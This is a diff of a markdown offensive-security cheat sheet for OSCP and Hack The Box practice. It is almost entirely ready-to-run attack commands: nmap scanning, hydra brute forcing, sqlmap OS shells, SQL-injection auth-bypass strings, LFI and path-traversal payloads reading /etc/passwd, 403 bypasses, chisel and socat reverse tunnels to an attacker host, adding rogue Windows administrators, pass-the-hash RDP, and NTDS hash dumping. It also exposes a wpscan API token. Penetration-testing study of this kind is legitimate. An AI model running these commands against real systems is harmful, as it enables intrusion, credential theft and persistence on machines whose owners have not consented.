@@ -9,19 +9,7 @@ image:
   alt: Offensive Security Cheat Sheet 
 ---
 _Inspiration and Credits [s4thv1k-oscp-cheatsheet](https://s4thv1k.com/posts/oscp-cheatsheet/)_
-## **Linux**
-
-### Command Linux
-
-- Adding Users
-
-```bash
-adduser name 
-useradd name
-
-useradd -u UID -g group name  #UID can be something new than existing, this command is to add a user to a specific group
-
-```
+# **Linux**
 
 ## **Network Enumeration**
 
@@ -40,8 +28,18 @@ nmap -p- --open --min-rate 5000 -sS -n -vvv -Pn IP -oG allPorts
 nmap -sCV -p 80,443,8080 IP -oN targeted
 
 nmap -sC -sV IP -oN targeted
+```
 
-1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null #automating port scan of first 1024 ports in powershell
+- Add to hosts
+
+```bash
+echo "10.10.11.252 domain.htb" | sudo tee -a /etc/hosts
+```
+
+#### Technology Detection on web
+
+```bash
+whatweb http://domain.htb/
 ```
 
 #### Masscan
@@ -89,9 +87,11 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP -s 2222 -t 15
 
 # SSH Brute Force
 hydra -f -l {USER} -P {pass.txt} ssh://{RHOST}
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -t  4 #example
 hydra -f -t 16 -L {user.txt} -P {pass.txt} ssh://{RHOST
 # Dicotrionary Attack
 hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh
+
 
 # Upload w scp
 scp file.txt user@IP:/home/user/Desktop
@@ -113,11 +113,24 @@ ssh adminuser@10.10.155.5 -i id_rsa -D 9050
 proxychains4 crackmapexec smb 10.10.10.0/24 #Example
 ```
 
+### Adding SSH Public Key
+
+```bash
+#This created both id_rsa and id_rsa.pub
+ssh-keygen -t rsa -b 2048 -f racc0x
+
+chmod 700 ~/.ssh
+touch authorized_keys # create file in ~/.ssh/ and copied content here
+chmod 600 authorized_keys
+
+ssh user@TARGETIP
+```
+
 #### FTP | TCP/21
 
 ```bash
 ftp 192.168.123.2
-
+ftp -A <RHOST>
 nmap -p21 --script=<name> <IP> #scan ftp w nmap
 
 wget -r ftp://IP
@@ -218,11 +231,10 @@ https://pentest-tools.com
 
 ### File Transfer
 
-- Downloading on Linux
-
 ```bash
-wget http://lhost/file
-curl http://lhost/file > output_file
+wget http://HOST:PORT/file
+curl http://HOST:PORT/file -o file
+python3 -m http.server 8080
 ```
 
 ### Password Hash | Cracking
@@ -254,18 +266,18 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip #Cracking zip files
 
 ---
 
-## **Web Pentest**
+## **Web Pentesting**
 
-### DNS Resolution Machine HTB
+[Script-Based Guide to Injection Attacks: SQLi, XSS, Command, XML, and HTML](https://medium.com/@harshleenchawla06/script-based-guide-to-injection-attacks-sqli-xss-command-xml-and-html-c11a810841e0)
 
-```bash
-echo "10.10.11.252 domain.htb" | sudo tee -a /etc/hosts
-```
+[File Inclusion - CheatSheet](https://github.com/attacker-codeninja/htb-cheatsheet/blob/master/lfi-rfi-cheatsheet.md)
+
+[HackTricks](https://book.hacktricks.xyz/)
+
 
 ### Domain Enumeration
 
 #### Dirsearch
-
 
 ```bash
 dirsearch -u http://url.htb
@@ -340,7 +352,6 @@ gobuster dir -u https://miwifi.com/ -w /usr/share/SecLists/Discovery/Web-Content
 gobuster dir -u https://miwifi.com/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html -s 200 -b ''
 ```
 
-#### Whatweb
 
 ```bash
 whatweb http://url.htb
@@ -357,6 +368,11 @@ curl -I "http://${TARGET}"
 curl -s -X GET "http://sub.domain.htb/102834710284/file.php?action=show&site=FUZZ&password=12345&session=" # fuzz in page 
 
 curl -X GET "http://domain.htb/_framework/file.dll" -H "Host: domain.htb" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" -H "X-Skipper-Proxy: http://127.0.0.1:5000" -H "Connection: close" --output file.dll #download file while BurpSuite with an vuln SSRF
+curl -v http://<DOMAIN>  # verbose output
+curl -X POST http://<DOMAIN>  # use POST method
+curl -X PUT http://<DOMAIN>  # use PUT method
+curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd # use --path-as-is to handle /../ or /./ in the given URL
+curl --proxy http://127.0.0.1:8080  # use proxy
 ```
 
 #### OpenSSL
@@ -371,27 +387,6 @@ openssl s_client -connect tinder.com:443 #Verifi Certificate Web
 sslscan domain.com
 ```
 
-### Subdomain Enumeration
-
-#### Ffuf
-
-```bash
-ffuf -u http://IP -H "Host: FUZZ.domain.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
-
-ffuf -c -u "http://domain.htb" -H "host: FUZZ.domain.htb" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -fc 301,302 -mc all
-```
-
-#### Gobuster
-
-```bash
-gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
-```
-
-#### Wfuzz
-
-```bash
-wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,403,404,302 -H "Host: FUZZ.blazorized.htb" -u http://blazorized.htb -t 100
-```
 
 #### Droopescan | Drupal | CMS
 
@@ -408,6 +403,7 @@ droopescan scan joomla --url http://site
 
 sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce 
 ```
+
 #### Magescan | Magento | CMS
 
 ```bash
@@ -432,6 +428,29 @@ wpscan --url http://domain.htb -U admin -P /usr/share/wordlists/rockyou.txt
 # Add Wpscan API to get the details of vulnerabilties.
 wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA
 ```
+
+### Subdomain Enumeration
+
+#### Ffuf
+
+```bash
+ffuf -u http://IP -H "Host: FUZZ.domain.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
+
+ffuf -c -u "http://domain.htb" -H "host: FUZZ.domain.htb" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -fc 301,302 -mc all
+```
+
+#### Gobuster
+
+```bash
+gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+```
+
+#### Wfuzz
+
+```bash
+wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,403,404,302 -H "Host: FUZZ.blazorized.htb" -u http://blazorized.htb -t 100
+```
+
 
 ### Dealing with Passwords
 
@@ -459,136 +478,6 @@ hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:na
 
 #Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
 ```
-
-### SQL Injection
-
-```text
-Auth Bypass
-
-'-'
-' '
-'&'
-'^'
-'*'
-' or ''-'
-' or '' '
-' or ''&'
-' or ''^'
-' or ''*'
-"-"
-" "
-"&"
-"^"
-"*"
-" or ""-"
-" or "" "
-" or ""&"
-" or ""^"
-" or ""*"
-or true--
-" or true--
-' or true--
-") or true--
-') or true--
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-admin' --
-admin' #
-admin'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-admin" --
-admin" #
-admin"/*
-admin" or "1"="1
-admin" or "1"="1"--
-admin" or "1"="1"#
-admin" or "1"="1"/*
-admin"or 1=1 or ""="
-admin" or 1=1
-admin" or 1=1--
-admin" or 1=1#
-admin" or 1=1/*
-admin") or ("1"="1
-admin") or ("1"="1"--
-admin") or ("1"="1"#
-admin") or ("1"="1"/*
-admin") or "1"="1
-admin") or "1"="1"--
-admin") or "1"="1"#
-admin") or "1"="1"/*
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
-admin' or '1'='1
-' or '1'='1
-" or "1"="1
-" or "1"="1"--
-" or "1"="1"/*
-" or "1"="1"#
-" or 1=1
-" or 1=1 --
-" or 1=1 -
-" or 1=1--
-" or 1=1/*
-" or 1=1#
-" or 1=1-
-") or "1"="1
-") or "1"="1"--
-") or "1"="1"/*
-") or "1"="1"#
-") or ("1"="1
-") or ("1"="1"--
-") or ("1"="1"/*
-") or ("1"="1"#
-) or '1`='1-
-
-MYSQL 
-
-' order by 1/*
-' order by 2/* 
-' order by 3/* 
-' order by 4/* 
-
-' order by 1-- -
-' order by 2-- -
-' order by 3-- -
-' order by 4-- -
-
-' union all select 1,2,3-- -
-
-MSSQL
-
-' order by 1--
-' order by 2--
-' order by 3--
-' order by 4--
-
-' union all select NULL,NULL,NULL--
-```
-- Blind SQL Injection
 
 ```bash
 #Application takes some time to reload, here it is 3 seconds
@@ -622,7 +511,7 @@ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping data
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there
 ```
 
-### Directory Traversal
+### Path Traversal | OWASP TOP 10
 
 ```bash
 cat /etc/passwd #displaying content through absolute path
@@ -649,7 +538,7 @@ http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Use
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
-### Local File Inclusion
+### Local File Inclusion | OWASP TOP 10
 
 ```bash
 #At first we need 
@@ -665,36 +554,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
 ```
 
-### Bypass 403 (Forbidden)
-
-```bash
-1. X-Original-URL:
-# GET /anything HTTP/1.1
-# Host: target.com
-# X-Original-URL: /admin
-
-2. Appending %2e after the first slash
-# http://target.io/admin => 403
-# http://target.io/%2e/admin => 200
-
-3. Try add dot (.) slash (/) and semicolon(;) in the URL
-# http://target.io/admin => 403
-# http://target.io/admi/. => 200
-# http://target.io//admi// => 200
-# http://target.io/./admi/.. => 200
-# http://target.io/;/admi/ => 200
-# http://target.io/.;/admi/ => 200
-# http://target.io//;//admi/ => 200
-
-4. Add "..;/" after the directory name
-# http://target.io/admin
-# http://target.io/admin..;/
-
-5. Try to uppercase the alphabet in the url
-# http://target.io/aDmIN
-```
-
-### LFI
+### LFI | OWASP TOP 10
 
 ```bash
 LFI EXPLOITS
@@ -737,6 +597,37 @@ zip payload.zip payload.php;
 mv payload.zip shell.jpg;
 rm payload.php
 ```
+
+
+### Bypass 403 (Forbidden)
+
+```bash
+1. X-Original-URL:
+# GET /anything HTTP/1.1
+# Host: target.com
+# X-Original-URL: /admin
+
+2. Appending %2e after the first slash
+# http://target.io/admin => 403
+# http://target.io/%2e/admin => 200
+
+3. Try add dot (.) slash (/) and semicolon(;) in the URL
+# http://target.io/admin => 403
+# http://target.io/admi/. => 200
+# http://target.io//admi// => 200
+# http://target.io/./admi/.. => 200
+# http://target.io/;/admi/ => 200
+# http://target.io/.;/admi/ => 200
+# http://target.io//;//admi/ => 200
+
+4. Add "..;/" after the directory name
+# http://target.io/admin
+# http://target.io/admin..;/
+
+1. Try to uppercase the alphabet in the url
+# http://target.io/aDmIN
+```
+
 
 ### Netcat | Nc
 
@@ -799,17 +690,10 @@ exiftool img.png
 exiftool *.pdf
 ```
 
-[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-[ExplainShell](https://www.explainshell.com/)
-[CrackShadow](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
-[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-[LinEnum](https://github.com/rebootuser/LinEnum)
-[LinuxSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration)
-[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)
-[GTFO-bins](https://gtfobins.github.io/)
 
 
-### Linux Privilege Escalation
+
+## Linux Privilege Escalation
 
 _Linux Enumeration Commands_
 
@@ -931,6 +815,31 @@ pass pass123
 cat /root/proof.txt && whoami && hostname && ip addr
 ```
 
+### Pivoting
+
+```bash
+# For this you need to configuration the proxychains.conf
+./chisel server -p 1234 --reverse #attacker machine .1
+./chisel client {IP}:1234 R:socks #victim machine .2 - tunnel redirection through a SOCKS socket.
+
+# Remote Port Forwarding
+./chisel client 10.10.10.1:1234 R:22:20.20.20.3:22 #victim machine .2 
+lsof -i:22 # Identify if the service is run by the port 22
+
+#shh with proxychains
+proxychains ssh user@20.20.20.3
+
+./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:6150 #victim machine .2
+./chisel client 20.20.20.2:1111 R:1111:socks #victim machine .3 
+
+
+./socat TCP-LISTEN:443,fork TCP:20.20.20.2:442 # 20.20.20.3
+./socat TCP-LISTEN:442,fork TCP:10.10.10.1:441 # 20.20.20.2
+
+
+
+```
+
 ### TTY
 
 ```bash
@@ -998,7 +907,20 @@ chmod +x <binary>
 
 ---
 
-## **Windows**
+## Tools
+
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+[ExplainShell](https://www.explainshell.com/)
+[CrackShadow](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
+[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+[LinEnum](https://github.com/rebootuser/LinEnum)
+[LinuxSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration)
+[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)
+[GTFO-bins](https://gtfobins.github.io/)
+[Chisel](https://github.com/jpillora/chisel)
+[Socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
+
+# **Windows**
 
 #### Downloading on Windows
 
@@ -1011,10 +933,14 @@ copy \\kali\share\file .
 
 ### Command Windows
 
+- Network Enumerate
 - Adding Users
 - What users belong to groups that allow remote management?
 
 ```powershell
+
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null #automating port scan of first 1024 ports in powershell
+
 net user hacker hacker123 /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
@@ -1053,6 +979,25 @@ function MyFunc {} # Create a function
 if ($condition) {} # Conditional statements
 # 
 Start-Process -Verb RunAs # Run command as admin
+```
+
+### RDP
+
+```bash
+xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
+xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
+xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
+xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
+xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
+rdesktop <RHOST>
+```
+
+### showmount
+
+```bash
+/usr/sbin/showmount -e <RHOST>
+sudo showmount -e <RHOST>
+chown root:root sid-shell; chmod +s sid-shell
 ```
 
 ### SMB
@@ -1592,7 +1537,6 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 # Post Exploitation
 
 > This is more windows specific as exam specific.
-> 
 
 <aside>
 💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!
@@ -2004,3 +1948,9 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 ---
 
+## Tools
+
+```bash
+[OSCP](https://github.com/0xsyr0/OSCP)
+[CheatSheet](https://github.com/exfilt/CheatSheet)
+```
